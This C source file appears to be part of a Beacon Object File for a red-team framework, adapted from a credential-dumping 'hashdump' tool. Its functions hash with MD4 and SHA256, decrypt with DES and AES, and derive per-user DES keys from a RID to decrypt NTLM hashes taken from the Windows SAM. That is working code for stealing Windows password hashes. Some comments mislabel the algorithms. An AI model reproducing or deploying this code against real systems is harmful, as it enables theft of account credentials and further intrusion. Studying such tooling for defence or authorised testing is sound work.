#include "include.h"

// Clanked
BOOL ComputeMd4Hash(PUCHAR pData, DWORD dwDataLen, PUCHAR output)
{
    NTSTATUS           status             = { 0 };
    BOOL               bSuccess           = FALSE;
    BCRYPT_ALG_HANDLE  hAlg               = { 0 };
    BCRYPT_HASH_HANDLE hHash              = { 0 };
    DWORD              dwHashObject       = { 0 };
    DWORD              dwData             = { 0 };
    PVOID              pHashObject        = { 0 };

    // Open SHA256 algorithm provider
    if ((status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_MD4_ALGORITHM, NULL, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptOpenAlgorithmProvider failed: Status: 0x%08lX\n", __func__, status);        
        goto cleanup;
    }

    // Get hash object size
    if ((status = BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&dwHashObject, sizeof(DWORD), &dwData, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptGetProperty failed: Status: 0x%08lX\n", __func__, status);
        goto cleanup;
    }

    // Allocate buffer
    pHashObject = calloc(1, dwHashObject);

    // Create hash object
    if ((status = BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptCreateHash failed: Status: 0x%08lX\n", __func__, status);        
        goto cleanup;
    }

    // Hash data
    if ((status = BCryptHashData(hHash, (PBYTE)pData, dwDataLen, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptHashData for key failed: Status: 0x%08lX\n", __func__, status);            
        goto cleanup;
    }

    // Finalize
    if ((status = BCryptFinishHash(hHash, output, dwHashObject, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptFinishHash failed: Status: 0x%08lX\n", __func__, status);          
        goto cleanup;
    }

    // If we reach the end, set status success
    bSuccess = TRUE;

cleanup:
    if (hHash)
        BCryptDestroyHash(hHash);
    if (pHashObject)
        SizeAndFreeBuffer((PPVOID)&pHashObject);
    if (hAlg)
        BCryptCloseAlgorithmProvider(hAlg, 0);

    return bSuccess;
}

// Clanked
BOOL ComputeSha256(PUCHAR key, DWORD keyLen, PUCHAR value, PUCHAR output)  // caller provides 32-byte buffer
{
    NTSTATUS           status             = { 0 };
    BOOL               bSuccess           = FALSE;
    BCRYPT_ALG_HANDLE  hAlg               = { 0 };
    BCRYPT_HASH_HANDLE hHash              = { 0 };
    DWORD              dwHashObject       = { 0 };
    DWORD              dwData             = { 0 };
    PVOID              pHashObject        = { 0 };

    // Open SHA256 algorithm provider
    if ((status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptOpenAlgorithmProvider failed: Status: 0x%08lX\n", __func__, status);        
        goto cleanup;
    }

    // Get hash object size
    if ((status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&dwHashObject, sizeof(DWORD), &dwData, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptGetProperty failed: Status: 0x%08lX\n", __func__, status);
        goto cleanup;
    }

    // Allocate buffer
    pHashObject = calloc(1, dwHashObject);

    // Create hash object
    if ((status = BCryptCreateHash(hAlg, &hHash, pHashObject, dwHashObject, NULL, 0, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptCreateHash failed: Status: 0x%08lX\n", __func__, status);        
        goto cleanup;
    }

    // Hash the key first
    if ((status = BCryptHashData(hHash, (PBYTE)key, keyLen, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptHashData for key failed: Status: 0x%08lX\n", __func__, status);            
        goto cleanup;
    }

    // Hash value[0..31] 1000 times
    for (int i = 0; i < 1000; i++)
    {
        if ((status = BCryptHashData(hHash, (PBYTE)value, 32, 0)) != STATUS_SUCCESS)
        {
            BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptHashData for value failed: Status: 0x%08lX\n", __func__, status);              
            goto cleanup;
        }
    }

    // Finalize
    if ((status = BCryptFinishHash(hHash, output, 32, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: BCryptFinishHash failed: Status: 0x%08lX\n", __func__, status);          
        goto cleanup;
    }

    // If we reach the end, set status success
    bSuccess = TRUE;

cleanup:
    if (hHash)
        BCryptDestroyHash(hHash);
    if (pHashObject)
        SizeAndFreeBuffer((PPVOID)&pHashObject);
    if (hAlg)
        BCryptCloseAlgorithmProvider(hAlg, 0);

    return bSuccess;
}

// https://github.com/Adaptix-Framework/Extension-Kit/blob/9413caf85fd83272f5866ef42f9e7ed8db9987d6/Creds-BOF/hashdump/hashdump.c#L26
BOOL DecryptDES(const BYTE *key, const BYTE *data, BYTE *output)
{
    BCRYPT_ALG_HANDLE hAlg     = { 0 };
    BCRYPT_KEY_HANDLE hKey     = { 0 };
    BOOL              bSuccess = FALSE;
    NTSTATUS          status   = { 0 };
    DWORD             dwResult = { 0 };

    // Open AES algorithm provider
    if ((status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_DES_ALGORITHM, NULL, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to open AES algorithm provider: Status: 0x%08lX\n", __func__, status);
        goto cleanup;  
    }

        // Set chaining mode to ECB
    if ((status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to set chaining mode: Status: 0x%08lX\n", __func__, status);
        goto cleanup; 
    }

    // Generate symmetric key
    if ((status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 8, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to generate symmetric key: Status: 0x%08lX\n", __func__, status);
        goto cleanup; 
    }

    // Decrypt
    if ((status = BCryptDecrypt(hKey, (PUCHAR)data, 8, NULL, NULL, 0, output, 8, &dwResult, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Decryption failed: Status: 0x%08lX\n", __func__, status);
        goto cleanup; 
    }

    // If we reach the end, set status success
    bSuccess = TRUE;

cleanup:

    if (hAlg)
        BCryptCloseAlgorithmProvider(hAlg, 0);
    if (hKey)
        BCryptDestroyKey(hKey);

    return bSuccess;
}

// https://github.com/Adaptix-Framework/Extension-Kit/blob/9413caf85fd83272f5866ef42f9e7ed8db9987d6/Creds-BOF/hashdump/hashdump.c#L60
BOOL DecryptAES( const BYTE *key, DWORD keyLen,const BYTE *iv,DWORD ivLen, const BYTE *encrypted, DWORD encryptedLen, PUCHAR decryptedOut, LPCWSTR Algorithm)
{
    BCRYPT_ALG_HANDLE hAlg            = { 0 };
    BCRYPT_KEY_HANDLE hKey            = { 0 };
    BOOL              bSuccess        = FALSE;
    NTSTATUS          status          = { 0 };
    DWORD             dwDecryptedSize = { 0 };

    // Open AES algorithm provider
    if ((status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to open AES algorithm provider: Status: 0x%08lX\n", __func__, status);
        goto cleanup; 
    }

    // Set chaining mode to CBC
    if ((status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)Algorithm, (wcslen(Algorithm) + 1) * sizeof(WCHAR), 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to set chaining mode: Status: 0x%08lX\n", __func__, status);
        goto cleanup; 
    }

    // Generate symmetric key
    if ((status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, keyLen, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Failed to generate symmetric key: Status: 0x%08lX\n", __func__, status);
        goto cleanup; 
    }

    // Decrypt
    if ((status = BCryptDecrypt(hKey, (PUCHAR)encrypted, encryptedLen, NULL, (PUCHAR)iv, ivLen, decryptedOut, encryptedLen, &dwDecryptedSize, 0)) != STATUS_SUCCESS)
    {
        BeaconFormatPrintf(&pOutBuf, "[-] %s: Decryption failed: Status: 0x%08lX\n", __func__, status);
        goto cleanup; 
    }

    // If we reach the end, set status success
    bSuccess = TRUE;

cleanup:

    if (hAlg)
        BCryptCloseAlgorithmProvider(hAlg, 0);
    if (hKey)
        BCryptDestroyKey(hKey);

    return bSuccess;
}

// https://github.com/Adaptix-Framework/Extension-Kit/blob/9413caf85fd83272f5866ef42f9e7ed8db9987d6/Creds-BOF/hashdump/hashdump.c#L627
BOOL DecryptHashWithRid(ULONG rid, PUCHAR encrypted_hash, PUCHAR decrypted_hash)
{
    UCHAR s1[7] = { 0 };
    UCHAR s2[7] = { 0 };
    UCHAR k1[8] = { 0 };
    UCHAR k2[8] = { 0 };

    // RID to key(s)
    s1[0] = rid & 0xff;
    s1[1] = (rid >> 8) & 0xff;
    s1[2] = (rid >> 16) & 0xff;
    s1[3] = (rid >> 24) & 0xff;
    s1[4] = s1[0];
    s1[5] = s1[1];
    s1[6] = s1[2];

    s2[0] = s1[3];
    s2[1] = s1[0];
    s2[2] = s1[1];
    s2[3] = s1[2];
    s2[4] = s2[0];
    s2[5] = s2[1];
    s2[6] = s2[2];

    k1[0] = ODD_PARITY[(s1[0] >> 1) << 1];
    k1[1] = ODD_PARITY[(((s1[0] & 0x01) << 6) | (s1[1] >> 2)) << 1];
    k1[2] = ODD_PARITY[(((s1[1] & 0x03) << 5) | (s1[2] >> 3)) << 1];
    k1[3] = ODD_PARITY[(((s1[2] & 0x07) << 4) | (s1[3] >> 4)) << 1];
    k1[4] = ODD_PARITY[(((s1[3] & 0x0F) << 3) | (s1[4] >> 5)) << 1];
    k1[5] = ODD_PARITY[(((s1[4] & 0x1F) << 2) | (s1[5] >> 6)) << 1];
    k1[6] = ODD_PARITY[(((s1[5] & 0x3F) << 1) | (s1[6] >> 7)) << 1];
    k1[7] = ODD_PARITY[(s1[6] & 0x7F) << 1];

    k2[0] = ODD_PARITY[(s2[0] >> 1) << 1];
    k2[1] = ODD_PARITY[(((s2[0] & 0x01) << 6) | (s2[1] >> 2)) << 1];
    k2[2] = ODD_PARITY[(((s2[1] & 0x03) << 5) | (s2[2] >> 3)) << 1];
    k2[3] = ODD_PARITY[(((s2[2] & 0x07) << 4) | (s2[3] >> 4)) << 1];
    k2[4] = ODD_PARITY[(((s2[3] & 0x0F) << 3) | (s2[4] >> 5)) << 1];
    k2[5] = ODD_PARITY[(((s2[4] & 0x1F) << 2) | (s2[5] >> 6)) << 1];
    k2[6] = ODD_PARITY[(((s2[5] & 0x3F) << 1) | (s2[6] >> 7)) << 1];
    k2[7] = ODD_PARITY[(s2[6] & 0x7F) << 1];

    // Decrypt with DES now
    if (!DecryptDES(k1, encrypted_hash, decrypted_hash) || !DecryptDES(k2, encrypted_hash + 8, decrypted_hash + 0x8))
        return FALSE;
    else
        return TRUE;
}